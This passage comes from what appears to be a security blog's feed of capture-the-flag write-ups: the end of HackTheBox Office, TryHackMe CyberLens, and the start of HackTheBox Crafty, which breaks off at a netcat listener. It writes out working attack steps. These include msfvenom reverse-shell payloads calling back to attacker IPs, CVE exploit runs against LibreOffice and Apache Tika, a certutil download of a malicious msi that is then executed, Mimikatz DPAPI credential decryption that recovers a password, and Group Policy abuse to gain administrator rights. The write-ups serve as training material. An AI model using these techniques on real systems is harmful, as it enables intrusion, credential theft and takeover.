<p><img src="/images/HTB-Office/hhogan-canpsremote.png" alt="hhogan CanPSRemote"></p>
<p>Moreover this user is also a member of the <code>GPO Managers</code> group, indicating that the user has permissions to manage Group Policy Objects (GPOs).</p>
<p><img src="/images/HTB-Office/gpo-managers-membership.png" alt="hhogan is a member of the GPO Managers group"></p>
<p>Running <code>netstat</code> in our meterpreter shell we notice <code>http</code> running on port <code>8083</code>, which we did not discover with nmap.</p>
<p><img src="/images/HTB-Office/netstat-cmd.png" alt="netstat command"></p>
<p>To access it we will use <a href="https://github.com/nicocha30/ligolo-ng" target="_blank" >ligolo-ng</a>

.</p>
<p>Going to <code>http://240.0.0.1:8083/</code> we find a business website for Holography Industries.</p>
<p><img src="/images/HTB-Office/business-website.png" alt="Internal business website"></p>
<p>Clicking on <code>Submit Application</code> leads us to <code>/resume.php</code>, a page where we can upload a resume for a job application.</p>
<p><img src="/images/HTB-Office/resume-php.png" alt="resume.php page for file submission"></p>
<p>Trying to upload a pdf file fails, and we learn that this application only accepts <code>Doc</code>, <code>Docx</code>, <code>Docm</code>, and <code>Odt</code> files.</p>
<p><img src="/images/HTB-Office/files-extensions.png" alt="file extensions acepted"></p>
<p>The files for this application are found at <code>C:\xampp\htdocs\internal</code>.</p>
<p><img src="/images/HTB-Office/internal-files.png" alt="Internal files"></p>
<h3 id="second-lateral-movement">Second Lateral Movement</h3>
<p>The <code>resume.php</code> file is owned by the <code>PPotts</code> user.</p>
<p><img src="/images/HTB-Office/resume-php-permissions.png" alt="resume.php file permissions"></p>
<p>We also find that Libre Office version 5.2 is running on the target.</p>
<p><img src="/images/HTB-Office/Libre-Office-version.png" alt="Libre Office version"></p>
<p>This is an outdated version vulnerable to <a href="https://www.libreoffice.org/about-us/security/advisories/cve-2023-2255/" target="_blank" >CVE-2023-2255</a>

 with a PoC available <a href="https://github.com/elweth-sec/CVE-2023-2255" target="_blank" >here</a>

.</p>
<p>We start by crafting a malicious exe file.</p>
<pre tabindex="0"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.4 LPORT=5555 -f exe -o shell.exe
</code></pre><p>Then we use the exploit.</p>
<pre tabindex="0"><code>python3 CVE-2023-2255.py --cmd &#39;C:\Users\Public\shell.exe&#39; --output &#39;exploit.odt&#39;
</code></pre><p><img src="/images/HTB-Office/malicious-odt.png" alt="Malicious odt file"></p>
<p>A few minutes after placing <code>shell.exe</code> at the correct location and uploading our <code>exploit.odt</code> file via the internal application we get a new meterpreter shell as <code>ppotts</code>.</p>
<p><img src="/images/HTB-Office/ppotts-shell.png" alt="ppotts meterpreter shell"></p>
<h3 id="third-lateral-movement">Third Lateral Movement</h3>
<p>We use <code>winpeas</code> to enumerate the target system and we find some DPAPI credentials files.</p>
<blockquote>
<p>DPAPI, which stands for Data Protection API, is a set of cryptographic services built into Windows operating systems. It provides developers with a straightforward way to protect sensitive data, such as passwords, encryption keys, and other confidential information, by encrypting and decrypting data using strong cryptographic algorithms.</p>
</blockquote>
<p><img src="/images/HTB-Office/DPAPI-Master-Keys.png" alt="DPAPI master keys"></p>
<p><img src="/images/HTB-Office/DPAPI-Credential-Files.png" alt="DPAPI credential files"></p>
<p>Running <code>cmdkey /list</code>, we learn that the the user <code>hhogan</code> credentials are currently stored on the target.</p>
<p><img src="/images/HTB-Office/cmdkey-cmd.png" alt="cmdkey command"></p>
<p>We find the credentials files at the specified address.</p>
<pre tabindex="0"><code>Get-ChildItem -Hidden C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\
</code></pre><p><img src="/images/HTB-Office/Credential-files.png" alt="Credential files location"></p>
<p>We also locate the master keys.</p>
<pre tabindex="0"><code>Get-ChildItem -Hidden C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\
</code></pre><p><img src="/images/HTB-Office/Master-key-files.png" alt="Credential files location"></p>
<blockquote>
<p>DPAPI (Data Protection API) credential files are used by Windows to securely store sensitive information, such as user credentials, passwords, and other secrets. DPAPI provides encryption services that applications can use to protect data, ensuring that it can only be decrypted by the same user who encrypted it or by a user with the correct keys.</p>
</blockquote>
<p>We can use Mimikatz to extract passwords from credential files. To decrypt a credential file, we first need to identify which master key was used to encrypt it. Next, we must decrypt the master key, and then use this decrypted master key to decrypt the credential file.</p>
<p>Thanks to winpeas we know that only two out of the three master keys are used for the credential files, the ones ending with <code>47eb</code> and <code>fc7d</code>.</p>
<hr>
<h3 id="side-note">Side Note</h3>
<p>If we do not know which master key is used to encrypt/decrypt a credential file, we can use Mimikatz to find out.</p>
<pre tabindex="0"><code>dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4
</code></pre><p><img src="/images/HTB-Office/master-key-used.png" alt="Mimikatz command to identify the correct master key used"></p>
<hr>
<p>We will start by decrypting the key that is used by two files (the one ending with <code>47eb</code>).</p>
<pre tabindex="0"><code>dpapi::masterkey /in:&#34;C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb&#34; /rpc
</code></pre><p><img src="/images/HTB-Office/decrypted-master-key.png" alt="Mimikatz command to decrypt master key"></p>
<p>With the decrypted master key we decrypt the credential file and recover the password <code>H4ppyFtW183#</code>.</p>
<pre tabindex="0"><code>dpapi::cred /in:&#34;C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4&#34; /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
</code></pre><p><img src="/images/HTB-Office/HHogan-password.png" alt="hhogan password recovered"></p>
<p>With the newly found credentials we login via evil-winrm as <code>hhogan</code>.</p>
<pre tabindex="0"><code>evil-winrm -u &#34;HHogan&#34; -p &#34;H4ppyFtW183#&#34; -i dc.office.htb
</code></pre><p><img src="/images/HTB-Office/HHogan-shell.png" alt="hhogan shell via evil-winrm"></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>We use <code>Get-GPO -All</code> to list all the GPOs of the domain. We find a few interesting ones but we need to check if this user has the permissions to interact with them. We also note their IDs.</p>
<p><img src="/images/HTB-Office/Default-Domain-Policy.png" alt="Default domain policy"></p>
<p><img src="/images/HTB-Office/Default-DC-policy.png" alt="Default DC domain policy"></p>
<p>With <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" >PowerView</a>

 we enumerate the GPO permissions. After downloading the script we need to import the module in order to use it.</p>
<pre tabindex="0"><code>Import-Module ./powerview.ps1
Get-NetGroup -name &#34;GPO Managers&#34;
</code></pre><p><img src="/images/HTB-Office/Powerview-GPO-Managers.png" alt="PowerView used to enumerate the GPO Managers group"></p>
<p>The <code>GPO Managers</code> group has an SID of <code>S-1-5-21-1199398058-4196589450-691661856-1117</code>.</p>
<p>We specifically target the <code>Default Domain Controllers Policy</code> and enumerate its permissions using PowerView.</p>
<pre tabindex="0"><code>Get-NetGPO | Where-Object { $_.DisplayName -eq &#34;Default Domain Controllers Policy&#34; } | ForEach-Object { Get-ObjectAcl -ResolveGUIDs -Name $_.Name }
</code></pre><p><img src="/images/HTB-Office/GPO-Permissions.png" alt="Default Domain Controller Policy permissions"></p>
<p>We notice that the listed SID matches the GPO Managers group&rsquo;s SID. Moreover <code>AceType</code> and <code>AceQualifier</code> are both set to <code>AccessAllowed</code>. This data confirms that the members of the <code>GPO Managers</code> group can exercise all the permissions they have on the <code>Default Domain Controllers Policy</code>.</p>
<p>We exploit this misconfiguration and add <code>hhogan</code> to the administrators group with a tool call <a href="https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0" target="_blank" >SharpGPOAbuse</a>

.</p>
<pre tabindex="0"><code>.\sharpgpoabuse.exe --AddLocalAdmin --UserAccount HHogan --GPOName &#34;Default Domain Controllers Policy&#34;
</code></pre><p><img src="/images/HTB-Office/sharpgpoabuse-cmd.png" alt="SharpGPOAbuse command"></p>
<p>We update the policy for the task to take effect.</p>
<pre tabindex="0"><code>gpupdate /force
</code></pre><p><img src="/images/HTB-Office/gpupdate.png" alt="gpudate command"></p>
<p>Now, we are indeed part of the <code>Administrators</code> group.</p>
<p><img src="/images/HTB-Office/administrators-add.png" alt="user added to the Administrators group"></p>
<p>All we need to do is log out and log in again to access the administrator&rsquo;s desktop and read the root flag.</p>
<p><img src="/images/HTB-Office/root-flag.png" alt="Root flag location"></p>
<h2 id="closing-words">Closing Words</h2>
<p>That&rsquo;s it for my first write up for a Hard box on HackTheBox! I have to admit the bump in difficulty and scope from Medium is very noticeable, but I was able to experiment with a lot of new tools during the exploitation of Office.</p>
<p>Learning Active Directory is a non-negotiable for aspiring security professionals especially on the technical side. I am still learning it but here are a few resources that you can use to deep dive into it:</p>
<ul>
<li>TryHackMe gives you access to two AD networks for free as long as you have a 7 days streak minimum, find them <a href="https://tryhackme.com/r/hacktivities" target="_blank" >here</a>

 in the <code>Networks</code> section.</li>
<li>They also have some free rooms pertaining to Active Directory such as <a href="https://tryhackme.com/r/room/winadbasics" target="_blank" >Active Directory Basics</a>

, <a href="https://tryhackme.com/r/room/attacktivedirectory" target="_blank" >Attacktive Directory</a>

, <a href="https://tryhackme.com/r/room/ra" target="_blank" >Ra</a>

, <a href="https://tryhackme.com/r/room/resetui" target="_blank" >Reset</a>

, and <a href="https://tryhackme.com/r/room/enterprise" target="_blank" >Enterprise</a>

.</li>
<li>HackTheBox Academy has multiple modules on Active Directory, go to <a href="https://academy.hackthebox.com/modules" target="_blank" >this</a>

 page and search for &ldquo;active directory&rdquo; to find them all.</li>
<li>If you are a book lover, I highly recommand <a href="https://www.amazon.com/Pentesting-Active-Directory-Windows-based-Infrastructure/dp/1804611360" target="_blank" >Pentesting Active Directory and Windows-based Infrastructure</a>

.</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>THM: CyberLens</title>
            <link>https://scorpiosec.com/posts/2024/06/thm-cyberlens/</link>
            <pubDate>Wed, 19 Jun 2024 14:37:09 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/06/thm-cyberlens/</guid>
            <description>Platform: TryHackMe Link: CyberLens Level: Easy OS: Windows CyberLens features a website with a metadata extraction feature. After some enumeration we discover that the feature is powered by Apache Tika, an outadated version of the software vulnerable to CVE-2018-1335 is running. We get our initial foothold by exploiting the vulnerability. For privilege escalation we abuse AlwaysInstallElevated to obtain a system shell.
Scanning We will use a Bash script to automate the scanning process.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: TryHackMe</li>
<li>Link: <a href="https://tryhackme.com/r/room/cyberlensp6" target="_blank" >CyberLens</a>

</li>
<li>Level: Easy</li>
<li>OS: Windows</li>
</ul>
<hr>
<p>CyberLens features a website with a metadata extraction feature. After some enumeration we discover that the feature is powered by Apache Tika, an outadated version of the software vulnerable to <code>CVE-2018-1335</code> is running. We get our initial foothold by exploiting the vulnerability. For privilege escalation we abuse <code>AlwaysInstallElevated</code> to obtain a system shell.</p>
<h2 id="scanning">Scanning</h2>
<p>We will use a Bash script to automate the scanning process. You can find it <a href="https://github.com/K-Scorpio/scripts-collection/blob/main/nmap_scan.sh" target="_blank" >here</a>

.</p>
<p>The script will:</p>
<ul>
<li>Scan a target IP for open ports</li>
<li>Extract them</li>
<li>Run a detailed scan on the open ports found and save the output in three different formats (.gnmap, .nmap, and .xml)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Running detailed scan on open ports: 80,135,139,445,3389,5985,47001,49664,49665,49667,49668,49669,49670,49677,61777
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-06-19 15:27 CDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.212.189
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.23s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>80/tcp    open  http          Apache httpd 2.4.57 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span>|_http-title: CyberLens: Unveiling the Hidden Matrix
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.57 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
</span></span><span style="display:flex;"><span>3389/tcp  open  ms-wbt-server Microsoft Terminal Services
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-06-19T20:27:52+00:00; -20s from scanner time.
</span></span><span style="display:flex;"><span>| rdp-ntlm-info: 
</span></span><span style="display:flex;"><span>|   Target_Name: CYBERLENS
</span></span><span style="display:flex;"><span>|   NetBIOS_Domain_Name: CYBERLENS
</span></span><span style="display:flex;"><span>|   NetBIOS_Computer_Name: CYBERLENS
</span></span><span style="display:flex;"><span>|   DNS_Domain_Name: CyberLens
</span></span><span style="display:flex;"><span>|   DNS_Computer_Name: CyberLens
</span></span><span style="display:flex;"><span>|   Product_Version: 10.0.17763
</span></span><span style="display:flex;"><span>|_  System_Time: 2024-06-19T20:27:42+00:00
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CyberLens
</span></span><span style="display:flex;"><span>| Not valid before: 2024-06-18T19:35:16
</span></span><span style="display:flex;"><span>|_Not valid after:  2024-12-18T19:35:16
</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49665/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49668/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49669/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49670/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49677/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>61777/tcp open  http          Jetty 8.y.z-SNAPSHOT
</span></span><span style="display:flex;"><span>|_http-title: Welcome to the Apache Tika 1.17 Server
</span></span><span style="display:flex;"><span>|_http-cors: HEAD GET
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Potentially risky methods: PUT
</span></span><span style="display:flex;"><span>|_http-server-header: Jetty<span style="color:#f92672">(</span>8.y.z-SNAPSHOT<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2024-06-19T20:27:43
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>|_clock-skew: mean: -20s, deviation: 0s, median: -21s
</span></span><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   3:1:1: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 70.15 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<p>Visiting the target IP address we find a website with an upload feature.</p>
<p><img src="/images/THM-CyberLens/cyberlens-website.png" alt="CyberLens website"></p>
<p>After capturing the request we get when we click on <code>Get Metadata</code> we see that the web server is making a request to port <code>61777</code>.</p>
<p><img src="/images/THM-CyberLens/port-for-request.png" alt="Request to port 61777"></p>
<p>Checking the port, we get to a web page featuring Apache Tika 1.17.</p>
<blockquote>
<p>&ldquo;The Apache Tika toolkit detects and extracts metadata and text from over a thousand different file types (such as PPT, XLS, and PDF).&rdquo; Source - <a href="https://github.com/apache/tika" target="_blank" >https://github.com/apache/tika</a>

</p>
</blockquote>
<p><img src="/images/THM-CyberLens/Apache-Tika.png" alt="Apache Tika Server"></p>
<p><strong>We are able to solve this room entirely via Metasploit, this writeup will showcase the manual way and the Metasploit method.</strong></p>
<h2 id="manual-exploitation">Manual Exploitation</h2>
<h3 id="user-flag">User flag</h3>
<p>Researching &ldquo;Apache Tika 1.17 rce&rdquo; leads us to <a href="https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/" target="_blank" >this</a>

 Rhino Security Labs article featuring CVE-2018-1335. A PoC is also available <a href="https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2018-1335/CVE-2018-1335.py" target="_blank" >here</a>

. To use it  we have to follow this example:</p>
<pre tabindex="0"><code>python3 CVE-2018-1335.py &lt;host&gt; &lt;port&gt; &lt;command&gt;
</code></pre><p>Since we are targeting a Windows machine we can make use of PowerShell to get a reverse shell.</p>
<blockquote>
<p>On <a href="https://www.revshells.com/" target="_blank" >revshells.com</a>

, we use a PowerShell #3 (base64) reverse shell</p>
</blockquote>
<pre tabindex="0"><code>python3 CVE-2018-1335.py &lt;Target_IP&gt; &lt;PORT_NUMBER&gt; &lt;INSERT REVSHELL HERE&gt;
</code></pre><p>After running the exploit we get a connection on our listener, we have a shell as the user <code>cyberlens</code>.</p>
<p><img src="/images/THM-CyberLens/initial-foothold.png" alt="Apache Tika Server"></p>
<p>We find the user flag on the user&rsquo;s Desktop.</p>
<p><img src="/images/THM-CyberLens/user-flag.png" alt="user.txt location"></p>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>For the system enumeration we use <a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS" target="_blank" >WinPEAS</a>

 and find that <code>AlwaysInstallElevated</code> is enabled.</p>
<p><img src="/images/THM-CyberLens/AlwaysInstallElevated.png" alt="Winpeas finds AlwaysInstallElevated is enabled"></p>
<p>The <code>AlwaysInstallElevated</code> setting in Windows is a Group Policy setting that, when enabled, allows Windows Installer to install programs with elevated privileges (i.e., administrative rights) regardless of the user&rsquo;s current privilege level. This setting is controlled through two registry keys:</p>
<ol>
<li><strong>HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</strong></li>
<li><strong>HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</strong></li>
</ol>
<p>If both of these registry keys are set to <code>1</code>, it means that any user, including those with only standard user privileges, can install MSI packages with elevated (administrator) privileges. <em>You can read more about it <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated" target="_blank" >here</a>

.</em></p>
<p><a href="https://juggernaut-sec.com/alwaysinstallelevated/#Abusing_AlwaysInstallElevated_to_Obtain_a_SYSTEM_Shell" target="_blank" >This</a>

 article explains how to abuse <code>AlwaysInstallElevated</code> to obtain a SYSTEM Shell.</p>
<ol>
<li>We craft a malicious msi file</li>
</ol>
<pre tabindex="0"><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.104.130 LPORT=1234 -a x64 --platform Windows -f msi -o evil.msi
</code></pre><p><img src="/images/THM-CyberLens/malicious-msi.png" alt="Malicious msi ile created with msfvenom"></p>
<ol start="2">
<li>Send it to the target</li>
</ol>
<pre tabindex="0"><code>certutil.exe -urlcache -split -f http://IP_ADDRESS:PORT_NUMBER/evil.msi evil.msi
</code></pre><ol start="3">
<li>Execute the msi file</li>
</ol>
<pre tabindex="0"><code>msiexec /quiet /qn /i evil.msi
</code></pre><ol start="4">
<li>We get a connection on our listener as <code>nt authority\system</code></li>
</ol>
<p><img src="/images/THM-CyberLens/system-shell.png" alt="System shell"></p>
<p>We can read the root flag (admin.txt) on the <code>Administrator</code> Desktop.</p>
<p><img src="/images/THM-CyberLens/root-flag-manual.png" alt="System shell"></p>
<hr>
<h2 id="metasploit-method">Metasploit Method</h2>
<h3 id="user-flag-1">User flag</h3>
<p>We know which software we are targeting, so we check Metasploit for exploits.</p>
<p>We do find an exploit for <code>Header Command Injection</code>.</p>
<p><img src="/images/THM-CyberLens/apache-tika-exploit.png" alt="Metasploit fins exploit for Apache Tika"></p>
<blockquote>
<p>Make sure to set all the options correctly. The remote port should be <code>61777</code>.</p>
</blockquote>
<p>After running the exploit we get a meterpreter shell.</p>
<p><img src="/images/THM-CyberLens/meterpreter-shell.png" alt="Meterpreter shell"></p>
<p>We find the user flag on the user Desktop.</p>
<h3 id="privilege-escalation-1">Privilege Escalation</h3>
<p>Now to elevate our privileges we can use the <code>exploit_suggester</code> in Metasploit to find some leads.</p>
<blockquote>
<p>You can background the current meterpreter shell with <code>background</code></p>
</blockquote>
<p><img src="/images/THM-CyberLens/metasploit-privesc.png" alt="Metasploit exploit suggester for privilege escalation"></p>
<p>All we have to do is to provide a session number and run the module.</p>
<p><img src="/images/THM-CyberLens/exploit-suggester.png" alt="Metasploit - Exploit suggester module use"></p>
<p>It finds five possible exploits for our target.</p>
<p><img src="/images/THM-CyberLens/exploits-list.png" alt="Exploits list found by exploit suggester in Metasploit"></p>
<p>We start with the first one.</p>
<pre tabindex="0"><code>use exploit/windows/local/always_install_elevated
</code></pre><p>We need to provide a session number, a local host and a local port.</p>
<p><img src="/images/THM-CyberLens/installed-elevated-exploit.png" alt="AlwaysInstallElevated exploit in Metasploit"></p>
<p>After running the exploit we get an elevated meterpreter session as <code>NT AUTHORITY\SYSTEM</code>.</p>
<p><img src="/images/THM-CyberLens/admin-shell.png" alt="Meterpreter system shell"></p>
<h2 id="closing-words">Closing Words</h2>
<p>Metasploit is a powerful framework allowing you to automate a lot of tasks. I am still learning how to optimally use it in order to make my life easier. I found two resources that will be helpful:</p>
<ul>
<li><a href="https://www.offsec.com/metasploit-unleashed/" target="_blank" >Metasploit Unleashed</a>

 - A free course by Offensive Security teaching you how to thoroughly use the framework.</li>
<li><a href="https://www.amazon.com/Metasploit-Penetration-Testers-David-Kennedy/dp/159327288X" target="_blank" >Metasploit: The Penetration Tester&rsquo;s Guide</a>

 - This book is old but it will deepen your understanding of the framework. If you end up liking it, know that the second edition is coming out in November 2024.</li>
</ul>
<p><strong>Note:</strong> OSCP seekers should learn <strong>NOT</strong> to rely too much on Metasploit because you are only allowed to use it once during the exam.</p>
]]></content>
        </item>
        
        <item>
            <title>HTB: Crafty</title>
            <link>https://scorpiosec.com/posts/2024/06/htb-crafty/</link>
            <pubDate>Wed, 12 Jun 2024 21:19:39 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/06/htb-crafty/</guid>
            <description>Platform: Hack The Box Link: Crafty Level: Easy OS: Windows Crafty is a Windows Server 2019 running Minecraft 1.16.5, this version is vulnerable to Log4Shell (CVE-2021-44228) and after using a PoC of the exploit we gain our initial foothold. On the target system, we find an archive containing some credential that we use to obtain an administrative shell.
Target IP - 10.10.11.249
Scanning sudo nmap -sC -sV -p- -oA nmap/Crafty 10.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: Hack The Box</li>
<li>Link: <a href="https://app.hackthebox.com/machines/Crafty" target="_blank" >Crafty</a>

</li>
<li>Level: Easy</li>
<li>OS: Windows</li>
</ul>
<hr>
<p>Crafty is a Windows Server 2019 running Minecraft 1.16.5, this version is vulnerable to Log4Shell (CVE-2021-44228) and after using a PoC of the exploit we gain our initial foothold. On the target system, we find an archive containing some credential that we use to obtain an administrative shell.</p>
<p>Target IP - <code>10.10.11.249</code></p>
<h2 id="scanning">Scanning</h2>
<pre tabindex="0"><code>sudo nmap -sC -sV -p- -oA nmap/Crafty 10.10.11.249
</code></pre><p><strong>Results</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-02-26 13:56 CST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> crafty.htb <span style="color:#f92672">(</span>10.10.11.249<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.054s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE   VERSION
</span></span><span style="display:flex;"><span>80/tcp    open  http      Microsoft IIS httpd 10.0
</span></span><span style="display:flex;"><span>|_http-title: Crafty - Official Website
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span>25565/tcp open  minecraft Minecraft 1.16.5 <span style="color:#f92672">(</span>Protocol: 127, Message: Crafty Server, Users: 0/100<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 171.62 seconds
</span></span></code></pre></div><p>We find two open ports:</p>
<ul>
<li>80 running HTTP</li>
<li>25565 running a Minecraft server with version 1.16.5</li>
</ul>
<p>Even though there is no redirection let&rsquo;s add <code>crafty.htb</code> to our hosts file.</p>
<pre tabindex="0"><code>sudo echo &#34;10.10.11.249 crafty.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id="enumeration">Enumeration</h2>
<p>When we go to the website we find a web page about a game called Crafty.</p>
<p><img src="/images/HTB-Crafty/crafty-webpage.png" alt="Crafty website"></p>
<p>There is nothing interesting on the web application so we turn our attention to the Minecraft server. When searching <code>minecraft 1.16.5 vulnerability</code> we find that there is a Log4j exploit for it with <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" target="_blank" >CVE-2021-44228</a>

.</p>
<blockquote>
<p><code>play.crafty.htb</code> redirects us to the main website.</p>
</blockquote>
<p><img src="/images/HTB-Crafty/log4j-Minecraft.png" alt="Minecraft Log4j exploit"></p>
<p>We then find a PoC for the exploit at this <a href="https://github.com/kozmer/log4j-shell-poc?source=post_page-----316a735a306d--------------------------------" target="_blank" >Github repo</a>

.</p>
<p>After checking the content of <code>poc.py</code> we notice that it is using <code>String cmd=&quot;/bin/sh&quot;;</code> which will not work on Windows. In order to make it Windows compatible we change that line to <code>String cmd=&quot;cmd.exe&quot;;</code>.</p>
<p><img src="/images/HTB-Crafty/log4j-poc-content.png" alt="Log4j PoC content"></p>
<p><img src="/images/HTB-Crafty/poc-python-change.png" alt="Log4j PoC content change"></p>
<p>On the exploit page, we read: &ldquo;<strong>Note:</strong> For this to work, the extracted java archive has to be named: <code>jdk1.8.0_20</code>, and be in the same directory.&rdquo;</p>
<p>Going to the website provided on the Github page we are required to create an account. After searching around we find some java archives on <a href="https://repo.huaweicloud.com/java/" target="_blank" >https://repo.huaweicloud.com/java/</a>

.</p>
<p>For a quick download and setup use the commands below.</p>
<pre tabindex="0"><code>#Make sure to download it in the log4j-shell-poc directory
wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz

tar -xf jdk-8u181-linux-x64.tar.gz

#Rename the file
mv jdk1.8.0_181 jdk1.8.0_20
</code></pre><h2 id="initial-foothold">Initial Foothold</h2>
<p>Here are all our files.</p>
<p><img src="/images/HTB-Crafty/log4j-poc-files.png" alt="Log4j PoC files"></p>
<p>We need a way to communicate with the Minecraft server, we will use <a href="https://github.com/ammaraskar/pyCraft" target="_blank" >pyCraft</a>

 for that. Let&rsquo;s setup a virtual environment for pyCraft.</p>
<pre tabindex="0"><code>virtualenv ENV

source ENV/bin/activate

pip install -r requirements.txt
</code></pre><p><img src="/images/HTB-Crafty/pyCraft-setup.png" alt="PyCraft setup"></p>
<p>Now we setup a listener to catch the shell.</p>
<pre tabindex="0"><code>rlwrap nc -lvnp 4444
